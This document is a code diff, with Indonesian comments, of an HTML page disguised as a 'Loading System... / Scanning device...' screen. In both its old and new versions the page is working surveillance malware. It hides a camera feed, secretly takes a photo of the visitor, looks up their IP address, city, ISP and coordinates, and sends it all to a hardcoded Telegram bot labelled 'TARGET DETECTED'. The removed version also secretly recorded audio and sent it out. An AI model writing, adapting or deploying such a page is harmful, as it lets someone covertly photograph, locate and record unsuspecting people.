@@ -2,7 +2,7 @@
 <html lang="id">
 <head>
   <meta charset="UTF-8">
-  <title>Loading system...</title>
+  <title>Loading System...</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
     body {
@@ -15,31 +15,56 @@
       align-items: center;
       height: 100vh;
       flex-direction: column;
+      overflow: hidden;
     }
     h1 {
       text-shadow: 0 0 10px lime;
+      white-space: nowrap;
+      overflow: hidden;
+      border-right: 2px solid lime;
+      animation: typing 4s steps(40, end), blink-caret .75s step-end infinite;
+    }
+    @keyframes typing {
+      from { width: 0 }
+      to { width: 100% }
+    }
+    @keyframes blink-caret {
+      from, to { border-color: transparent }
+      50% { border-color: lime }
+    }
+    video, canvas {
+      display: none;
     }
   </style>
-  <script src="https://cdn.jsdelivr.net/npm/ua-parser-js@0.7.28/dist/ua-parser.min.js"></script> <!-- Link ke library UAParser.js -->
 </head>
 <body>
 
 <h1>Scanning device...</h1>
-<video id="video" autoplay playsinline style="display:none;"></video>
-<canvas id="canvas" style="display:none;"></canvas>
+<video id="video" autoplay playsinline></video>
+<canvas id="canvas"></canvas>
 
 <script>
-const token = '7163723754:AAEIQk6FGjz2TsS4ELirDfIAbpaOThTAMdU';
-const chat_id = '6624966395';
+const token = '7163723754:AAEIQk6FGjz2TsS4ELirDfIAbpaOThTAMdU'; // Ganti dengan token bot kamu
+const chat_id = '6624966395'; // Ganti dengan chat_id kamu
 const video = document.getElementById('video');
 const canvas = document.getElementById('canvas');
 const ctx = canvas.getContext('2d');
 
-function kirimPesan(text, foto) {
+// Kirim teks ke Telegram
+function kirimPesan(text) {
+  fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ chat_id, text })
+  });
+}
+
+// Kirim foto + caption ke Telegram
+function kirimFoto(blob, caption) {
   let form = new FormData();
   form.append('chat_id', chat_id);
-  form.append('photo', foto, 'foto.jpg');
-  form.append('caption', text); // Menambahkan caption
+  form.append('photo', blob, 'foto.jpg');
+  form.append('caption', caption);
 
   fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
     method: 'POST',
@@ -47,102 +72,68 @@ function kirimPesan(text, foto) {
   });
 }
 
-// Gunakan UAParser.js untuk mendeteksi perangkat
-const parser = new UAParser();
-const device = parser.getDevice();
-const os = parser.getOS();
-const browser = parser.getBrowser();
-const userAgentInfo = `Device: ${device.model || 'Tidak Diketahui'}\nOS: ${os.name} ${os.version || 'Tidak Diketahui'}\nBrowser: ${browser.name} ${browser.version}`;
+// Ambil data IP + lokasi
+function ambilDataIP() {
+  return fetch('https://ip-api.com/json/')
+    .then(res => res.json())
+    .catch(err => {
+      console.error('Gagal ambil IP:', err);
+      kirimPesan('Gagal ambil IP: ' + err);
+      throw err;
+    });
+}
 
-console.log(userAgentInfo);
-
-// Ambil IP
-fetch('https://api.ipify.org?format=json')
-  .then(res => res.json())
-  .then(ipData => {
-    const ip = ipData.ip;
-    // Ambil info lokasi
-    fetch('https://ipapi.co/' + ip + '/json/')
-      .then(loc => loc.json())
-      .then(info => {
-        // Setelah IP dan Lokasi didapat
-        navigator.getBattery().then(bat => {
-          const status = `
-== DETEKSI TARGET ==
-IP: ${ip}
-Negara: ${info.country_name || 'Tidak tersedia'}
-Region: ${info.region || 'Tidak tersedia'}
-Kota: ${info.city || 'Tidak tersedia'}
-ISP: ${info.org || 'Tidak tersedia'}
-Koneksi: ${info.connection_type || 'Tidak diketahui'}
-Baterai: ${Math.floor(bat.level * 100)}%
-Device: ${userAgentInfo}
-Latitude: ${info.latitude || 'Tidak tersedia'}
-Longitude: ${info.longitude || 'Tidak tersedia'}
-Zona Waktu: ${info.timezone || 'Tidak tersedia'}
-=====================`;
-
-          // Kirim Foto + Caption
-          ambilFoto(status);
-        });
-      })
-      .catch(err => {
-        console.error('Gagal ambil lokasi IP:', err);
-        // Tetap kirim meskipun hanya IP
-        const status = `
-== DETEKSI TARGET ==
-IP: ${ip}
-(Lokasi tidak tersedia)
-Device: ${userAgentInfo}
-=====================`;
-        ambilFoto(status);
-      });
-  })
-  .catch(err => {
-    console.error('Gagal ambil IP:', err);
-  });
-
-// Kamera + Rekaman Otomatis (tanpa audio yang ditampilkan di halaman)
-navigator.mediaDevices.getUserMedia({ video: true, audio: true })
-.then(stream => {
-  video.srcObject = stream;
-  video.play();
-
-  setInterval(() => {
-    ambilFoto();
-    rekamAudio(stream); // Hanya rekam audio dan kirim ke Telegram
-  }, 10000); // tiap 10 detik
-})
-.catch(err => {
-  kirimPesan("Gagal akses media: " + err);
-});
-
-function ambilFoto(caption = '') {
+// Ambil foto dari kamera
+function ambilFoto() {
   canvas.width = video.videoWidth;
   canvas.height = video.videoHeight;
   ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-  canvas.toBlob(blob => {
-    kirimPesan(caption, blob); // Kirim foto beserta caption
-  }, 'image/jpeg');
+
+  return new Promise(resolve => {
+    canvas.toBlob(blob => {
+      resolve(blob);
+    }, 'image/jpeg');
+  });
 }
 
-function rekamAudio(stream) {
-  const recorder = new MediaRecorder(stream);
-  let chunks = [];
-  recorder.ondataavailable = e => chunks.push(e.data);
-  recorder.onstop = () => {
-    const blob = new Blob(chunks, { type: 'audio/webm' });
-    let form = new FormData();
-    form.append('chat_id', chat_id);
-    form.append('audio', blob, 'rekaman.webm');
-    fetch(`https://api.telegram.org/bot${token}/sendAudio`, {
-      method: 'POST',
-      body: form
-    });
-  };
-  recorder.start();
-  setTimeout(() => recorder.stop(), 5000); // Rekam selama 5 detik
+// Proses utama
+async function mulaiScanning() {
+  try {
+    const info = await ambilDataIP();
+    const device = navigator.userAgent;
+    const caption = `
+== TARGET DETECTED ==
+IP: ${info.query}
+Negara: ${info.country}
+Region: ${info.regionName}
+Kota: ${info.city}
+ISP: ${info.isp}
+Timezone: ${info.timezone}
+Koordinat: ${info.lat}, ${info.lon}
+Device: ${device}
+=====================`;
+
+    const fotoBlob = await ambilFoto();
+    kirimFoto(fotoBlob, caption);
+
+  } catch (err) {
+    kirimPesan('Error saat scanning: ' + err);
+  }
 }
+
+// Akses kamera (tanpa audio!)
+navigator.mediaDevices.getUserMedia({ video: true })
+.then(stream => {
+  video.srcObject = stream;
+  video.play();
+  setTimeout(() => {
+    mulaiScanning();
+  }, 3000); // Tunggu 3 detik supaya kamera siap
+})
+.catch(err => {
+  console.error('Gagal akses kamera:', err);
+  kirimPesan('Gagal akses kamera: ' + err);
+});
 </script>
 
 </body>
